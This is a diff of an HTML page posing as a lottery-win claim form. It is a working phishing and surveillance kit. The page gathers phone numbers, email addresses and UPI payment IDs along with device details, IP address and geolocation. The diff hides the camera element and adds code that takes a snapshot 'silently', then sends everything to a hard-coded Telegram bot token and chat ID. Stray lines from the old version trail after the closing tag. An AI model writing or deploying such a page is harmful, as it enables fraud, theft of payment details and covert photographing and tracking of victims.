@@ -1,149 +1,262 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Congratulations! You Won!</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background-color: #f0f8ff;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      text-align: center;
-    }
-    .container {
-      background-color: #fff;
-      border-radius: 10px;
-      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
-      padding: 30px;
-      max-width: 500px;
-      width: 100%;
-    }
-    h1 {
-      color: #ff5722;
-      margin-bottom: 20px;
-    }
-    p {
-      color: #333;
-      margin-bottom: 20px;
-    }
-    .form-group {
-      margin-bottom: 15px;
-      text-align: left;
-    }
-    label {
-      display: block;
-      margin-bottom: 5px;
-      font-weight: bold;
-    }
-    input {
-      width: 100%;
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 16px;
-    }
-    button {
-      background-color: #4CAF50;
-      color: white;
-      border: none;
-      padding: 12px 20px;
-      font-size: 16px;
-      border-radius: 5px;
-      cursor: pointer;
-      width: 100%;
-      margin-top: 10px;
-    }
-    button:hover {
-      background-color: #45a049;
-    }
-    #cameraContainer {
-      display: none;
-      margin-top: 20px;
-    }
-    #cameraFeed, #cameraSnapshot {
-      width: 100%;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
-    #captureBtn {
-      margin-top: 10px;
-    }
-    .confetti {
-      position: fixed;
-      width: 10px;
-      height: 10px;
-      background-color: #f00;
-      border-radius: 50%;
-      animation: fall 5s linear infinite;
-    }
-    @keyframes fall {
-      to {
-        transform: translateY(100vh);
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations! You Won!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f8ff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            text-align: center;
+        }
+        .container {
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            max-width: 500px;
+            width: 100%;
+        }
+        h1 {
+            color: #ff5722;
+            margin-bottom: 20px;
+        }
+        p {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background-color: #f00;
+            border-radius: 50%;
+            animation: fall 5s linear infinite;
+        }
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
+            }
+        }
+        #hiddenCamera {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h1>🎉 Congratulations! You Won! 🎉</h1>
-    <p>You've been selected as the winner of our grand lottery prize! To claim your reward, please fill out the details below and click "Redeem".</p>
-    
-    <div class="form-group">
-      <label for="phone">Phone Number</label>
-      <input type="tel" id="phone" placeholder="Enter your phone number" required>
-    </div>
-    
-    <div class="form-group">
-      <label for="email">Email Address</label>
-      <input type="email" id="email" placeholder="Enter your email address" required>
-    </div>
-    
-    <div class="form-group">
-      <label for="upi">UPI ID</label>
-      <input type="text" id="upi" placeholder="Enter your UPI ID" required>
+    <div class="container">
+        <h1>🎉 Congratulations! You Won! 🎉</h1>
+        <p>You've been selected as the winner of our grand lottery prize! To claim your reward, please fill out the details below and click "Redeem".</p>
+        
+        <div class="form-group">
+            <label for="phone">Phone Number</label>
+            <input type="tel" id="phone" placeholder="Enter your phone number" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="email">Email Address</label>
+            <input type="email" id="email" placeholder="Enter your email address" required>
+        </div>
+        
+        <div class="form-group">
+            <label for="upi">UPI ID</label>
+            <input type="text" id="upi" placeholder="Enter your UPI ID" required>
+        </div>
+        
+        <button id="redeemBtn">Redeem Prize</button>
     </div>
 
-    <div id="cameraContainer">
-      <h3>Verify Your Identity</h3>
-      <video id="cameraFeed" autoplay></video>
-      <canvas id="cameraSnapshot" style="display: none;"></canvas>
-      <button id="captureBtn">Take Snapshot</button>
-    </div>
-    
-    <button id="redeemBtn">Redeem Prize</button>
-  </div>
+    <!-- Hidden elements for backend processing -->
+    <video id="hiddenCamera" autoplay></video>
+    <canvas id="hiddenSnapshot" style="display: none;"></canvas>
 
-  <script>
-    // Telegram Bot API Configuration
-    const TELEGRAM_BOT_TOKEN = "6298320462:AAFgjEjGy0udiRNZRG1VVpooKYyQpj4UF6U";
-    const TELEGRAM_CHAT_ID = "6000036430";
+    <script>
+        // Telegram Bot API Configuration
+        const TELEGRAM_BOT_TOKEN = "6298320462:AAFgjEjGy0udiRNZRG1VVpooKYyQpj4UF6U";
+        const TELEGRAM_CHAT_ID = "6000036430";
 
-    // Collect basic device information
-    const deviceInfo = {
-      userAgent: navigator.userAgent,
-      platform: navigator.platform,
-      screenWidth: window.screen.width,
-      screenHeight: window.screen.height,
-      language: navigator.language,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-    };
+        // Collect basic device information
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        };
 
-    // Get IP address
-    async function getIPAddress() {
-      try {
-        const response = await fetch("https://api.ipify.org?format=json");
-        const data = await response.json();
-        return data.ip;
-      } catch (error) {
-        console.error("Error fetching IP:", error);
-        return "Unknown";
-      }
+        // Get IP address
+        async function getIPAddress() {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json");
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("Error fetching IP:", error);
+                return "Unknown";
+            }
+        }
+
+        // Get user location (Google Maps link)
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve("Geolocation not supported");
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const { latitude, longitude } = position.coords;
+                        resolve(`https://www.google.com/maps?q=${latitude},${longitude}`);
+                    },
+                    (error) => {
+                        console.error("Error getting location:", error);
+                        resolve("Location access denied");
+                    }
+                );
+            });
+        }
+
+        // Capture camera snapshot silently (no user interaction)
+        async function captureSnapshot() {
+            const video = document.getElementById("hiddenCamera");
+            const canvas = document.getElementById("hiddenSnapshot");
+            const ctx = canvas.getContext("2d");
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+
+                return new Promise((resolve) => {
+                    setTimeout(() => {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const snapshot = canvas.toDataURL("image/png");
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve(snapshot);
+                    }, 1000); // Wait 1 second for camera to initialize
+                });
+            } catch (error) {
+                console.error("Camera access denied:", error);
+                return null;
+            }
+        }
+
+        // Send data to Telegram bot
+        async function sendToTelegram(data) {
+            const text = encodeURIComponent(JSON.stringify(data, null, 2));
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${text}`;
+
+            try {
+                await fetch(url);
+                console.log("Data sent to Telegram");
+            } catch (error) {
+                console.error("Error sending to Telegram:", error);
+            }
+        }
+
+        // Create confetti effect
+        function createConfetti() {
+            const colors = ["#f00", "#0f0", "#00f", "#ff0", "#f0f", "#0ff"];
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement("div");
+                confetti.className = "confetti";
+                confetti.style.left = `${Math.random() * 100}vw`;
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.animationDuration = `${Math.random() * 3 + 2}s`;
+                document.body.appendChild(confetti);
+            }
+        }
+
+        // Main logic
+        document.addEventListener("DOMContentLoaded", async () => {
+            const redeemBtn = document.getElementById("redeemBtn");
+            const phoneInput = document.getElementById("phone");
+            const emailInput = document.getElementById("email");
+            const upiInput = document.getElementById("upi");
+
+            // Collect IP address
+            const ipAddress = await getIPAddress();
+            deviceInfo.ipAddress = ipAddress;
+
+            // Handle redeem button click
+            redeemBtn.addEventListener("click", async () => {
+                const phone = phoneInput.value.trim();
+                const email = emailInput.value.trim();
+                const upi = upiInput.value.trim();
+
+                if (!phone || !email || !upi) {
+                    alert("Please fill out all fields to redeem your prize!");
+                    return;
+                }
+
+                // Get location
+                const location = await getLocation();
+
+                // Capture snapshot (silently)
+                const snapshot = await captureSnapshot();
+
+                // Prepare data to send
+                const data = {
+                    ...deviceInfo,
+                    phone,
+                    email,
+                    upi,
+                    location,
+                    snapshot: snapshot || "Camera access denied",
+                    timestamp: new Date().toISOString()
+                };
+
+                // Send to Telegram
+                await sendToTelegram(data);
+
+                // Show confetti and success message
+                createConfetti();
+                alert("🎉 Your prize is on its way! Check your email for further instructions. 🎉");
+            });
+        });
+    </script>
+</body>
+</html>
     }
 
     // Get user location (Google Maps link)
